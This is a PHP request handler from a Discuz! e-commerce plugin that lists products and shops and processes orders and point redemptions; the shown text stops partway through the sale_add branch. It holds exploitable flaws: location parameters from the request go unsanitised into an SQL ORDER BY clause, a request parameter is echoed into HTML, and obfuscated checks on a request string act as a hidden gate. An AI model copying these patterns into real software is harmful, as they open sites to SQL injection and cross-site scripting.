<?php
session_start();ob_start();
/*
 * CopyRight  : [DisM!] (C)2001-2099 DisM Inc.
 * Created on : 2021-01-02,16:36:49
 * Author     : DisM!Ӧ������ dism.taobao.com $
 * Description: This is NOT a freeware, use is subject to license terms.
 * ����Դ��Դ�������ռ�,��������ѧϰ����������������ҵ��;����������24Сʱ��ɾ��!
 * ����ַ�������Ȩ��,�뼰ʱ��֪����,���Ǽ���ɾ��!
 */
 
if(!defined('IN_DISCUZ')) {
	exit('Access Denied');
}

require_once DISCUZ_ROOT.'./source/plugin/it618_brand/shop.func.php';
require_once DISCUZ_ROOT.'./source/plugin/it618_brand/brand_function.func.php';

$uid = $_G['uid'];
$it618_pid=intval($_GET['it618_pid']);

$pagetype=$_GET['pagetype'];
$idforly=intval($_GET['idforly']);


if($_GET['ac']=="getmode"){
	$modeid=intval($_GET['modeid']);
	require_once DISCUZ_ROOT.'./source/plugin/it618_brand/getmode.func.php';

	if($it618_brand_diy=C::t('#it618_brand#it618_brand_diy')->fetch_by_id($modeid)){
		if($it618_brand_diy['it618_isjs']==1){
			if((time()-$it618_brand_diy["it618_time"])<(60*$it618_brand_diy["it618_catchtime"])){
				return;
			}else{
				C::t('#it618_brand#it618_brand_diy')->update_it618_time_by_id(time(),$it618_brand_diy["id"]);
			}
			
			$tmpstr = it618_brand_getmodecontent($it618_brand_diy['it618_type'],$it618_brand_diy['it618_modecode'],$it618_brand_diy['it618_count']);
			$tmpstr=str_replace(array("\r\n", "\r", "\n"),"",$tmpstr);
			$tmpstr=str_replace("'",'"',$tmpstr);
			
			echo "document.write('".$tmpstr."')";
		}
	}

}


if($_GET['ac']=="home_goods"){
	$home_goods=C::t('#it618_brand#it618_brand_set')->getsetvalue_by_setname($_GET['ac1']);
	
	$tmparr=explode(",",$home_goods);
	if($_GET['wap']!=1){
		if(count($tmparr)>2){
			$goods_count=$tmparr[0];
		}else{
			$goods_count=15;
		}
	}else{
		if(count($tmparr)>2){
			$goods_count=$tmparr[1];
		}else{
			$goods_count=8;
		}
	}
	
	if($_GET['ac1']=='zjsalegoods'){
		if($IsPinEdu==1){
			$query = DB::query("SELECT p.it618_pid FROM ".DB::table('it618_pinedu_goods')." p left join ".DB::table('it618_brand_goods')." g on p.it618_pid=g.id and p.it618_shoptype='brand' and UNIX_TIMESTAMP(it618_time2)>".$_G['timestamp']." left join ".DB::table('it618_brand_brand')." b on g.it618_shopid=b.id where g.it618_ison=1 and g.it618_state=1 and b.it618_state=2 and b.it618_htstate=1 GROUP BY p.it618_pid ORDER BY g.it618_salecount desc limit 0,".$goods_count);
		}else{
			$query = DB::query("SELECT max(id) as maxid,it618_pid FROM ".DB::table('it618_brand_money')." where it618_pid>0 GROUP BY it618_pid ORDER BY maxid desc limit 0,".$goods_count);
		}
	}
	
	if($_GET['ac1']=='weeksalegoods'){
		$query = DB::query("SELECT id as it618_pid from ".DB::table('it618_brand_goods')." where it618_xgtype>0 and UNIX_TIMESTAMP(it618_xgtime2)>".$_G['timestamp']." order by it618_xgtime2 limit 0,".$goods_count);
	}
	
	if($_GET['ac1']=='newjfgoods'){
		$query = DB::query("SELECT g.id as it618_pid FROM ".DB::table('it618_brand_goods')." g left join ".DB::table('it618_brand_brand')." b on g.it618_shopid=b.id where g.it618_ison=1 and g.it618_state=1 and b.it618_state=2 and b.it618_htstate=1 ORDER BY g.id desc limit 0,".$goods_count);
	}
	
	if($_GET['ac1']=='hotjfgoods'){
		$query = DB::query("SELECT g.id as it618_pid FROM ".DB::table('it618_brand_goods')." g left join ".DB::table('it618_brand_brand')." b on g.it618_shopid=b.id where g.it618_ison=1 and g.it618_state=1 and b.it618_state=2 and b.it618_htstate=1 ORDER BY g.it618_views desc limit 0,".$goods_count);
	}
	
	if($_GET['wap']!=1){
		$i=1;
		$home_goodstmp='';
		while($it618_homegoods = DB::fetch($query)) {
			
			if(!($it618_brand_goods = C::t('#it618_brand#it618_brand_goods')->fetch_by_id($it618_homegoods['it618_pid']))){
				continue;
			}else{
				if($it618_brand_goods['it618_ison']!=1||$it618_brand_goods['it618_state']!=1)continue;
			}
			
			$it618_brand_brand=C::t('#it618_brand#it618_brand_brand')->fetch_by_id($it618_brand_goods['it618_shopid']);
		
			if($i%5==1){$home_goodstmp.='<li>';$noml=' noml';}else{$noml='';}
			$tmpurl=it618_brand_getrewrite('shop_product',$it618_brand_goods['it618_shopid'].'@'.$it618_brand_goods['id'],'plugin.php?id=it618_brand:product&sid='.$it618_brand_goods['it618_shopid'].'&pid='.$it618_brand_goods['id']);
			
			$it618_brand_brand=C::t('#it618_brand#it618_brand_brand')->fetch_by_id($it618_brand_goods['it618_shopid']);
			
			$jfblstr='';
			if($it618_brand_goods['it618_saletype']==6){
				$goodsmoney=round(($it618_brand_goods['it618_uprice']*$it618_brand_goods['it618_prepaybl']/100),2);
				$jfblstr=$it618_brand_lang['s857'].$goodsmoney.$it618_brand_lang['s389'].' ';
			}
			
			if($it618_brand_goods['it618_isalipay']==1&&$it618_brand_goods['it618_jfbl']>0){
				$jfblstr.=$it618_brand_lang['s2'].$it618_brand_goods['it618_jfbl'].'%'.$creditname;
			}
			
			$jfbl='';
			if($jfblstr!=''){
				$jfbl='<div class="divjfbl">'.$jfblstr.'</div>';
			}
		
			$it618_count=$it618_brand_lang['s1652'].' <font color="#FF6600">'.$it618_brand_goods['it618_count'].'</font>';
			
			if($it618_brand_goods['it618_isalipay']==1){
				$pricestr='<span class="price">&yen;'.floatval($it618_brand_goods['it618_uprice']).'</span><del style="font-weight:normal;font-size:16px">&yen;'.floatval($it618_brand_goods['it618_price']).'</del>';
			}else{
				$pricestr='<span class="price" style="color:#390">'.$it618_brand_goods['it618_score'].'<span style="font-weight:normal;font-size:15px">'.$creditname.'</span></span>';
			}
			
			if($_GET['ac1']=='zjsalegoods'){
				if($IsPinEdu==1){
					if(!$it618_pinedu_goods=C::t('#it618_pinedu#it618_pinedu_goods')->fetch_price_by_it618_shoptype_pid('brand',$it618_brand_goods['id'])){
						if(!$it618_pinedu_goods=C::t('#it618_pinedu#it618_pinedu_goods')->fetch_score_by_it618_shoptype_pid('brand',$it618_brand_goods['id'])){
						}
					}
					$pricestr='<span class="price" style="color:red"><img src="source/plugin/it618_pinedu/images/goodspin.png" style="height:20px; margin-right:6px;margin-top:1px">&yen;'.floatval($it618_pinedu_goods['it618_price']).'</span><del style="font-weight:normal;font-size:16px">&yen;'.floatval($it618_brand_goods['it618_price']).'</del>';
				}
			}
			
			if($it618_brand_goods['it618_isalipay']==1&&$it618_brand_goods['it618_isduihuan']==1){
				$jfblstr='<span style="float:right"><font color=#339900>'.$it618_brand_goods['it618_score'].$creditname.'</font></span>'.$jfblstr;
			}
			
			$salecount = C::t('#it618_brand#it618_brand_sale')->count_by_it618_pid($it618_brand_goods['id']);
			$salecount='<span style="float:right">'.it618_brand_getlang('s872').$salecount.'</span>';
			
			if($it618_brand_goods['it618_isalipay']==0&&$it618_brand_goods['it618_isduihuan']==0){
				$pricestr='<span class="price" style="color:green">'.$it618_brand_lang['s761'].'</span>';
				$jfblstr=$it618_brand_lang['s1732'].'<br>';
				$salecount='<span style="float:right;">'.it618_brand_getlang('t474').' <font color=#FF6600>'.$it618_brand_goods['it618_views'].'</font></span>';
			}
			
			$pjhaocount=C::t('#it618_brand#it618_brand_sale')->count_by_it618_pj_pid(1,$it618_brand_goods['id']);
			$pjallcount=C::t('#it618_brand#it618_brand_sale')->count_pj_by_pid($it618_brand_goods['id']);
			$pjhaobl=intval($pjhaocount/$pjallcount*100);
			$pj=$it618_brand_lang['s1899'];
			if($pjallcount>0)$pj=' '.it618_brand_getlang('s1821').''.$pjallcount.' '.it618_brand_getlang('s1822').''.$pjhaobl.'%';
			
			$home_goodstmp.='<div class="small-goods small-goods1'.$noml.'">
							  '.$jfbl.'
							  <a class="small-goods-img" href="'.$tmpurl.'" target="_blank"><img class="dynload lsSwitchload" src="source/plugin/it618_brand/images/a.gif" imgsrc="'.it618_brand_getgoodspic($it618_brand_goods['it618_shopid'],$it618_brand_goods['id'],$it618_brand_goods['it618_picbig']).'" alt="'.$it618_brand_goods['it618_name'].'" width="198" height="183" />
							  <span class="small-goods-place">'.$it618_brand_brand['it618_name'].'<br><span style="font-size:12px;line-height:14px">'.$it618_brand_goods['it618_seodescription'].'</span></span>
							  </a>
							  <h4>
								  <a class="small-goods-name" href="'.$tmpurl.'" target="_blank" title="'.$it618_brand_goods['it618_name'].'">'.$it618_brand_goods['it618_name'].'</a>
							  </h4>
							  
							  <div class="small-goods-info">
								  <div class="saletype">'.$salecount.$pj.'</div>
								  '.$pricestr.'
							  </div>
						  </div>';
			if($i%5==0)$home_goodstmp.='</li>';
			$i=$i+1;
		}
		if(($i-1)%5>0)$home_goodstmp.='</li>';
		
		$home_goodstmp='<div id="'.$_GET['ac1'].'" class="slider-warp lazy_start" options="'.$_GET['ac1'].'|left|0|5000|1000|1|1|0|1">
							<div class="slider-ulwarp">
								<ul class="slider-ul">'.$home_goodstmp.'</ul>	
							</div>
						</div>';
						
		echo $home_goodstmp;exit;
	}else{
		$width=intval($_GET['width']/3-15);
		$home_goodstmp='';
		while($it618_homegoods = DB::fetch($query)) {
			if(!($it618_brand_goods = C::t('#it618_brand#it618_brand_goods')->fetch_by_id($it618_homegoods['it618_pid']))){
				continue;
			}else{
				if($it618_brand_goods['it618_ison']!=1||$it618_brand_goods['it618_state']!=1)continue;
			}
		
			$tmpurl=it618_brand_getrewrite('brand_wap','product@'.$it618_brand_goods['it618_shopid'].'@0@'.$it618_brand_goods['id'].'@0','plugin.php?id=it618_brand:wap&pagetype=product&sid='.$it618_brand_goods['it618_shopid'].'&cid='.$it618_brand_goods['id']);
					
			if($it618_brand_goods['it618_isalipay']==1){
				$pricestr='<span><span>&yen;</span>'.$it618_brand_goods['it618_uprice'].'</span>';
			}else{
				$pricestr='<span class="jfprice">'.$it618_brand_goods['it618_score'].'<span style="font-size:10px">'.$creditname.'</span></span>';
			}
			
			if($_GET['ac1']=='zjsalegoods'){
				if($IsPinEdu==1){
					if(!$it618_pinedu_goods=C::t('#it618_pinedu#it618_pinedu_goods')->fetch_price_by_it618_shoptype_pid('brand',$it618_brand_goods['id'])){
						if(!$it618_pinedu_goods=C::t('#it618_pinedu#it618_pinedu_goods')->fetch_score_by_it618_shoptype_pid('brand',$it618_brand_goods['id'])){
						}
					}
					$pricestr='<img src="source/plugin/it618_pinedu/images/goodspin.png" style="height:15px; margin-right:6px;margin-top:-3px;display:inline-table"><span><span>&yen;</span>'.$it618_pinedu_goods['it618_price'].'</span>';
				}
			}
			
			if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])return;
			
			$home_goodstmp.='<td width="'.$width.'"><a href="'.$tmpurl.'">
								<img width="'.$width.'" src="'.it618_brand_getgoodspic($it618_brand_goods['it618_shopid'],$it618_brand_goods['id'],$it618_brand_goods['it618_picbig']).'"/>
								<div class="tdname">'.$it618_brand_goods['it618_name'].'</div>
								<div class="tdprice">'.$pricestr.'</div>
							</a>
							</td>';
		}
		
		echo '<tr>'.$home_goodstmp.'</tr>';exit;
	}
}


if($_GET['ac']=="home_shop"){
	$lbslat=$_GET['lbslat'];
	$lbslng=$_GET['lbslng'];
	
	if($_GET['ac1']=='hot'){
		$hotclassbrand=C::t('#it618_brand#it618_brand_set')->getsetvalue_by_setname('hotclassbrand');
		$hotclassbrand=explode('@@@',$hotclassbrand);
		$tmpidsarr=explode(',',$hotclassbrand[2]);
		
		$it618_homeshops = array();
		for($i=1;$i<=count($tmpidsarr);$i++){
			$id=intval($tmpidsarr[$i-1]);
			$it618_brand_brand=C::t('#it618_brand#it618_brand_brand')->fetch_by_id($id);
			if($it618_brand_brand['it618_state']==2&&$it618_brand_brand['it618_htstate']==1){
				$it618_brand_brand['it618_shopid']=$id;
				$it618_homeshops[] = $it618_brand_brand;
			}
		}
	}

	if($_GET['ac1']=='lbs'){
		$it618_homeshops = DB::fetch_all("SELECT id as it618_shopid FROM ".DB::table('it618_brand_brand')." where it618_state=2 and it618_htstate=1 and it618_lbslat>0 ORDER BY SQRT(($lbslng -it618_lbslng)*($lbslng -it618_lbslng)+($lbslat -it618_lbslat)*($lbslat -it618_lbslat)) limit 0,".$it618_brand['brand_lsbcount']);
	}
	
	if($lbslat>0){
		if (file_exists(DISCUZ_ROOT.'./source/plugin/it618_brand/config/mapapi.php')){
			require DISCUZ_ROOT.'./source/plugin/it618_brand/config/mapapi.php';
		}
	}

	$home_shoptmp='';
	foreach($it618_homeshops as $it618_homeshop) {
		
		$it618_brand_brand=C::t('#it618_brand#it618_brand_brand')->fetch_by_id($it618_homeshop['it618_shopid']);
		
		$it618_brand_brandgroup = C::t('#it618_brand#it618_brand_brandgroup')->fetch_by_id($it618_brand_brand['it618_power']);
		$ShopPowerIco='';
		if($it618_brand_brandgroup['it618_img']!='')$ShopPowerIco='<img src="'.$it618_brand_brandgroup['it618_img'].'" style="margin-top:-1px;height:18px;margin-right:3px"/>';
		
		$tmpurl=it618_brand_getrewrite('brand_wap','shop@'.$it618_brand_brand['id'],'plugin.php?id=it618_brand:wap&pagetype=shop&sid='.$it618_brand_brand['id']);
		$plcount=C::t('#it618_brand#it618_brand_home_ly')->count_by_shopid($it618_brand_brand['id'])+C::t('#it618_brand#it618_brand_product_ly')->count_by_shopid($it618_brand_brand['id'])+C::t('#it618_brand#it618_brand_article_ly')->count_by_shopid($it618_brand_brand['id']);
		
		$pjcount=C::t('#it618_brand#it618_brand_sale')->count_by_it618_pj_shopid($it618_brand_brand[id]);
		$it618_brand_level=C::t('#it618_brand#it618_brand_level')->fetch_by_type_salecount(0,$pjcount);
		$tmplevelarr=explode(",",$it618_brand['brand_level']);
		
		$it618_youhui='<div class="tddes">'.$it618_brand_brand['it618_youhui'].'</div>';
		
		$lbsm='';
		if($lbslat>0&&$it618_brand_brand['it618_lbslat']>0){
			if($mapapi_lbsmaptype=='gdmap'||$mapapi_lbsmaptype=='txmap'){
				$lbsm=it618_brand_getdistance($lbslng,$lbslat,$it618_brand_brand['it618_lbslng'],$it618_brand_brand['it618_lbslat']);
			}
			if($mapapi_lbsmaptype=='bdmap'){
				$tmparr=explode(",",$it618_brand_brand['it618_mappoint']);
				$lbsm=it618_brand_getdistance($lbslng,$lbslat,$tmparr[0],$tmparr[1]);
			}
			
			if($lbsm<1000)$lbsm=intval($lbsm).'m';
			if($lbsm>=1000)$lbsm=round($lbsm/1000,1).'km';
		}
		
		$home_shoptmp.='<tr>
						  <td onclick="location.href=\''.$tmpurl.'\'">
							  <img class="tdimg" src="'.it618_brand_getwapppic($it618_brand_brand['id'],$it618_brand_brand['it618_logo']).'"/>
							  <div class="tdname1">'.$it618_brand_brand['it618_name'].'</div>
							  <div class="tdabout"><span style="float:right">'.$lbsm.'</span>'.$ShopPowerIco.'<img style="margin-top:-3px;" src="'.$it618_brand_level['it618_img'].'"></div>
							  '.$it618_youhui.'
							  <div class="tddes1">'.$it618_brand_brand['it618_addr'].'</div>
						  </td>
						</tr>';
					
	}
	
	echo $home_shoptmp;
	exit;
}


if($_GET['ac']=="getsaleaudio"){
	if($it618_brand_saleaudio=C::t('#it618_brand#it618_brand_saleaudio')->fetch_by_it618_shopid($_GET['shopid'])){

		if(isset($_GET['update']))$isupdate=1;
		
		if($it618_brand_saleaudio['it618_state']==1){
			$isupdate=1;
			echo 'it618_splitok';
		}
		
		if($isupdate==1){
			C::t('#it618_brand#it618_brand_saleaudio')->update($it618_brand_saleaudio['id'],array(
				'it618_state' => 0
			));
		}
		
		exit;
	}
}

if($_GET['formhash']!=FORMHASH)return;


if($_GET['ac']=="getmapapi"){
	if (file_exists(DISCUZ_ROOT.'./source/plugin/it618_brand/config/mapapi.php')){
		require DISCUZ_ROOT.'./source/plugin/it618_brand/config/mapapi.php';
	}
	dsetcookie('it618_brand_getmapapi',$_GET['lbslat'].'it618_split'.$_GET['lbslng'].'it618_split'.it618_brand_utftogbk($_GET['lbsaddr']),$mapapi_lbstime*60);
}


if($_GET['ac']=="payok"){
	if($_GET['ac1']=="pay"){
		$salecount=DB::result_first("SELECT count(1) FROM ".DB::table('it618_brand_sale')." WHERE it618_type=2 and id=".intval($_GET['saleid']));
	}
	if($_GET['ac1']=="gwcpay"){
		$salecount=DB::result_first("SELECT count(1) FROM ".DB::table('it618_brand_gwcsale_main')." WHERE it618_state=1 and id=".intval($_GET['saleid']));
	}
	if($salecount>0){
		echo 'it618_splitok';exit;
	}
}


if($_GET['ac']=="order_add"){
	if($uid<=0){
		echo it618_brand_getlang('s484');
	}else{

		$it618_count=intval($_GET['it618_count']);
		$it618_gtypeid=intval($_GET['it618_gtypeid']);
		$it618_brand_goods = C::t('#it618_brand#it618_brand_goods')->fetch_by_id($_GET['pid']);
		
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($it618_count<=0){
			echo it618_brand_getlang('s485');exit;
		}
		
		if($it618_gtypeid>0){
			if($it618_brand_goods_type=C::t('#it618_brand#it618_brand_goods_type')->fetch_by_idok($it618_gtypeid)){
				$goods_price=$it618_brand_goods_type['it618_uprice'];
			}else{
				echo it618_brand_getlang('s1213');it618_brand_delsalework();exit;
			}
		}else{
			$goods_price=$it618_brand_goods['it618_uprice'];
		}
		
		$creditnum=C::t('#it618_brand#it618_brand_sale')->fetch_extcredits_by_uid($it618_brand['brand_credit'],$uid);
		if($creditnum>=$it618_brand['brand_orderbuycount']){
			if($ii1i11i[9]!='n')return;
			
			if(!isset($_GET['it618_tel'])){
				$it618_brand_addr = C::t('#it618_brand#it618_brand_addr')->fetch_by_id($_GET['it618_addrid']);
				$curaddr=it618_brand_getlang('s438').$it618_brand_addr['it618_name']." ".it618_brand_getlang('s439').$it618_brand_addr['it618_addr']." ".it618_brand_getlang('s441').$it618_brand_addr['it618_tel'];
				$it618_addr=$curaddr;
				$it618_addr1=$it618_brand_addr['it618_addr'];
				$it618_tel=$it618_brand_addr['it618_tel'];
			}else{
				$it618_addr='';
				$it618_addr1='';
				$it618_tel=$_GET['it618_tel'];
			}
			
			
			if($it618_brand_cardmoney=C::t('#it618_brand#it618_brand_cardmoney')->fetch_by_shopid_uid($ShopId,$uid)){
				$allmoney=$it618_brand_cardmoney['it618_money1']+$it618_brand_cardmoney['it618_money2'];
				$fetch_by_money=C::t('#it618_brand#it618_brand_viplevel')->fetch_by_money($ShopId,$allmoney);
				$viplevel=$fetch_by_money['it618_level'];
			}
			
			if($viplevel!=''){
				$it618_zk=$fetch_by_money['it618_zk'];
				if($_GET['it618_zk']!=$it618_zk){
					echo it618_brand_getlang('s1509');exit;
				}
			}else{
				$it618_zk=100;
			}
			
			$id = C::t('#it618_brand#it618_brand_order')->insert(array(
				'it618_shopid' => $ShopId,
				'it618_uid' => $uid,
				'it618_pid' => $_GET['pid'],
				'it618_pname' => $it618_brand_goods['it618_name'],
				'it618_gtypename' => $it618_brand_goods_type['it618_name'].$it618_brand_goods_type['it618_name1'],
				'it618_gtypeid' => $it618_gtypeid,
				'it618_price' => $goods_price,
				'it618_zk' => $it618_zk,
				'it618_count' => $it618_count,
				'it618_jfcount' => $it618_brand['brand_orderbuycount'],
				'it618_addr' => $it618_addr,
				'it618_addr1' => $it618_addr1,
				'it618_tel' => $it618_tel,
				'it618_bz' => it618_brand_utftogbk($_GET['it618_bz']),
				'it618_state' => 1,
				'it618_time' => $_G['timestamp']
			), true);
			
			if($id>0){
				C::t('common_member_count')->increase($uid, array(
					'extcredits'.$it618_brand['brand_credit'] => (0-$it618_brand['brand_orderbuycount']))
				);

				$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
				if($ii1i11i[3]!='1')return;
				
				echo "ok";
				it618_brand_sendmessage('order_shop',$id);
				
			}else{
				echo it618_brand_getlang('s490');exit;
			}
		}else{
			echo it618_brand_getlang('s1510').$creditname.it618_brand_getlang('s1511');exit;
		}
	}
}


if($_GET['ac']=="sale_add"){
	if($uid<=0){
		echo it618_brand_getlang('s484');
	}else{
		set_time_limit (0);
		ignore_user_abort(true);
		
		usleep(mt_rand(300,10000));
	
		$flagkm=0;$times=0;
		while($flagkm==0){
			if(DB::result_first("select count(1) from ".DB::table('it618_brand_salework'))==0){
				$flagkm=1;
			}
			if($flagkm==0){
				sleep(1);
				$times=$times+1;
			}
			if($times>60){
				it618_brand_delsalework();
			}
		}
		C::t('#it618_brand#it618_brand_salework')->insert(array(
			'it618_iswork' => 1
		), true);
		
		
		if($it618_brand['brand_buyself']==0){
			if($ShopUid==$uid){
				echo it618_brand_getlang('s586');it618_brand_delsalework();exit;
			}
		}
		
		if($it618_brand['brand_bdtel']==1){
			if($it618_members['members_isok']!=''){
				$count=DB::result_first("SELECT count(1) FROM ".DB::table('it618_members_user')." WHERE it618_uid=".$_G['uid']);
				if($count==0){					
					echo $it618_brand_lang['s1887'];it618_brand_delsalework();exit;
				}
			}
		}
		
		$pid=intval($_GET['pid']);
		$it618_saletype=intval($_GET['it618_saletype']);
		$it618_gtypeid=intval($_GET['it618_gtypeid']);
		$it618_count=intval($_GET['it618_count']);
		$it618_brand_goods = C::t('#it618_brand#it618_brand_goods')->fetch_by_id($_GET['pid']);
		
		if($IsUnion==1&&$_GET['tuijcode']!=''){
			require_once DISCUZ_ROOT.'./source/plugin/it618_union/unionsaletc.func.php';
			$it618_tuijid=Union_IsTuiJoin('brand',$pid,$_GET['tuijcode']);
		}
		
		if($it618_brand_goods['it618_isduihuan']!=1){
			echo it618_brand_getlang('s1213');it618_brand_delsalework();exit;
		}
		
		if($it618_brand_goods['it618_saletype']==4){
			if(!($it618_saletype==1||$it618_saletype==2)){
				echo it618_brand_getlang('s1213');it618_brand_delsalework();exit;
			}
		}else{
			if($it618_saletype!=$it618_brand_goods['it618_saletype']){
				echo it618_brand_getlang('s1213');it618_brand_delsalework();exit;
			}
		}
		
		$typecount=C::t('#it618_brand#it618_brand_goods_type')->counttype_by_pid_ok($_GET['pid']);
		if($typecount>0){
			if($it618_gtypeid==0){
				echo it618_brand_getlang('t766');it618_brand_delsalework();exit;
			}
		}
		
		if($IsGroup==1){
			$salepower=it618_brand_groupsalepower($pid);
			if($salepower==1){
				echo it618_brand_getlang('s1969');it618_brand_delsalework();exit;
			}
			if($salepower==2){
				echo it618_brand_getlang('s1970');it618_brand_delsalework();exit;
			}
		}
		
		if($it618_gtypeid>0){
			if($it618_brand_goods_type=C::t('#it618_brand#it618_brand_goods_type')->fetch_by_idok($it618_gtypeid)){
				$goods_count=$it618_brand_goods_type['it618_count'];
				$goods_price=$it618_brand_goods_type['it618_uprice'];
				$goods_score=$it618_brand_goods_type['it618_score'];
			}else{
				echo it618_brand_getlang('s1213');it618_brand_delsalework();exit;
			}
		}else{
			$goods_count=$it618_brand_goods['it618_count'];
			$goods_price=$it618_brand_goods['it618_uprice'];
			$goods_score=$it618_brand_goods['it618_score'];
		}
		
		if($it618_saletype==2){
			if($_GET['yunfeiscore']<0){
				echo it618_brand_getlang('s1213');it618_brand_delsalework();exit;
			}else{
				$yunfeiscore=0;
				if($_GET['it618_kdid']>0){
					$it618_brand_kdyunfei=C::t('#it618_brand#it618_brand_kdyunfei')->fetch_by_id($_GET['it618_kdid']);
					if($it618_brand_goods['it618_kgbl']>0){
						if($it618_count*$it618_brand_goods['it618_kgbl']>$it618_brand_kdyunfei['it618_firstkg']){
							$yunfeiscore=$it618_brand_kdyunfei['it618_firstkgscore']+$it618_brand_kdyunfei['it618_kgscore']*($it618_count*$it618_brand_goods['it618_kgbl']-$it618_brand_kdyunfei['it618_firstkg']);
						}else{
							$yunfeiscore=$it618_brand_kdyunfei['it618_firstkgscore'];
						}
					}else{
						if($it618_count>$it618_brand_kdyunfei['it618_firstcount']){
							$yunfeiscore=$it618_brand_kdyunfei['it618_firstscore']+$it618_brand_kdyunfei['it618_score']*($it618_count-$it618_brand_kdyunfei['it618_firstcount']);
						}else{
							$yunfeiscore=$it618_brand_kdyunfei['it618_firstscore'];
						}
					}
				}
			}
		}
		
		if($it618_brand_goods['it618_xiangoutime']==0){
			$buycount=DB::result_first("SELECT sum(it618_count) FROM ".DB::table('it618_brand_sale')." where it618_pid=".intval($_GET['pid'])." and it618_type!=0 AND it618_state!=5 and it618_uid=".$uid);				
		}else{
			$time=$_G['timestamp']-$it618_brand_goods['it618_xiangoutime']*3600*24;
			
			$buycount=DB::result_first("SELECT sum(it618_count) FROM ".DB::table('it618_brand_sale')." where it618_pid=".intval($_GET['pid'])." and it618_time>$time and it618_type!=0 AND it618_state!=5 and it618_uid=".$uid);
		}
		
		if($buycount=='')$buycount=0;
		
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($it618_count<=0){
			echo it618_brand_getlang('s485');it618_brand_delsalework();exit;
		}
		if($it618_count>$goods_count){
			echo it618_brand_getlang('s486');it618_brand_delsalework();exit;
		}elseif($it618_brand_goods['it618_xiangoucount']>0&&$it618_count>$it618_brand_goods['it618_xiangoucount']-$buycount){
			if($it618_brand_goods['it618_xiangoutime']==0){
				echo it618_brand_getlang('s1134').$it618_brand_goods['it618_xiangoucount'].$it618_brand_goods['it618_punit'].it618_brand_getlang('s1135').$buycount.$it618_brand_goods['it618_punit'].it618_brand_getlang('s1140');it618_brand_delsalework();exit;
			}else{
				echo it618_brand_getlang('s1137').$it618_brand_goods['it618_xiangoutime'].it618_brand_getlang('s1138').$it618_brand_goods['it618_xiangoucount'].$it618_brand_goods['it618_punit'].it618_brand_getlang('s1139').$buycount.$it618_brand_goods['it618_punit'].it618_brand_getlang('s1140');it618_brand_delsalework();exit;
			}
		}else{
			$creditnum=C::t('#it618_brand#it618_brand_sale')->fetch_extcredits_by_uid($it618_brand['brand_credit'],$_G['uid']);

			if($creditnum=="")$creditnum=0;
			if($creditnum>=($it618_count*$goods_score+$yunfeiscore)){
				if($ii1i11i[9]!='n')return;
				$tmptime=$_G['timestamp'];
				
				if($it618_saletype==2){
					$it618_brand_addr = C::t('#it618_brand#it618_brand_addr')->fetch_by_id($_GET['it618_addrid']);
					$curaddr=it618_brand_getlang('s438').$it618_brand_addr['it618_name']." ".it618_brand_getlang('s439').$it618_brand_addr['it618_addr']." ".it618_brand_getlang('s441').$it618_brand_addr['it618_tel'];
					$it618_addr=$curaddr;
					$it618_addr1=$it618_brand_addr['it618_addr'];
					$it618_tel=$it618_brand_addr['it618_tel'];
				}else{
					$it618_addr='';
					$it618_addr1='';
					$it618_tel=$_GET['it618_tel'];
				}
				
				$it618_brand_brand = C::t('#it618_brand#it618_brand_brand')->fetch_by_id($ShopId);
				$tc=intval($it618_brand_brand['it618_tcbl']*($goods_score*$it618_count)/100);
				
				$it618_kdid=0;
				if($_GET['it618_kdid']>0){
					$it618_brand_kdyunfei=C::t('#it618_brand#it618_brand_kdyunfei')->fetch_by_id($_GET['it618_kdid']);
					$it618_kdid=$it618_brand_kdyunfei['it618_kdid'];
				}
				
				if($IsGroup==1){
					$vipzk=it618_brand_getvipzk($pid);
				}
				
				if($vipzk>0){
					$it618_sfscore=intval($goods_score*$it618_count*$vipzk/100)+$yunfeiscore;
				}else{
					$it618_sfscore=$goods_score*$it618_count+$yunfeiscore;
				}
			
				$id = C::t('#it618_brand#it618_brand_sale')->insert(array(
					'it618_shopid' => $ShopId,
					'it618_uid' => $uid,
					'it618_pid' => $_GET['pid'],
					'it618_pname' => $it618_brand_goods['it618_name'],
					'it618_gtypename' => $it618_brand_goods_type['it618_name'].$it618_brand_goods_type['it618_name1'],
					'it618_saletype' => $it618_saletype,
					'it618_gtypeid' => $it618_gtypeid,
					'it618_tuijid' => $it618_tuijid,
					'it618_score' => $goods_score,
					'it618_price' => $goods_price,
					'it618_kdid' => $it618_kdid,
					'it618_yunfei' => $yunfeiscore,
					'it618_vipzk' => $vipzk,
					'it618_sfmoney' => 0,
					'it618_sfscore' => $it618_sfscore,
					'it618_count' => $it618_count,
					'it618_addr' => $it618_addr,
					'it618_addr1' => $it618_addr1,
					'it618_tel' => $it618_tel,
					'it618_bz' => it618_brand_utftogbk($_GET['it618_bz']),
					'it618_type' => 1,
					'it618_state' => 1,
					'it618_alipaybl' => $it618_brand_goods['it618_jfbl'],
					'it618_tcbl' => $it618_brand_brand['it618_tcbl'],
					'it618_tc' => $tc,
					'it618_time' => $tmptime
				), true);
				
				if($id>0){
					if($it618_tuijid>0){
						require_once DISCUZ_ROOT.'./source/plugin/it618_union/unionsaletc.func.php';
						Union_TuiTC_Add($it618_tuijid,$id);
					}
					if($it618_saletype==1||$it618_saletype==6)it618_brand_setcode($id);
					if($it618_saletype==3)it618_brand_setkm($id);
					if($it618_saletype==5)it618_brand_qrxf($id);
			
					C::t('#it618_brand#it618_brand_money')->insert(array(
						'it618_shopid' => $ShopId,
						'it618_saleid' => $id,
						'it618_pid' => intval($_GET['pid']),
						'it618_money' => ($goods_price*$it618_count),
						'it618_score' => ($goods_score*$it618_count+$yunfeiscore),
						'it618_uid' => $uid,
						'it618_state' => 1,
						'it618_type' => 2,
						'it618_time' => $tmptime
					), true);
					
					C::t('common_member_count')->increase($_G['uid'], array(
						'extcredits'.$it618_brand['brand_credit'] => (0-$it618_sfscore))
					);

					$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
					
					$it618_brand_sale=C::t('#it618_brand#it618_brand_sale')->fetch_by_id($id);
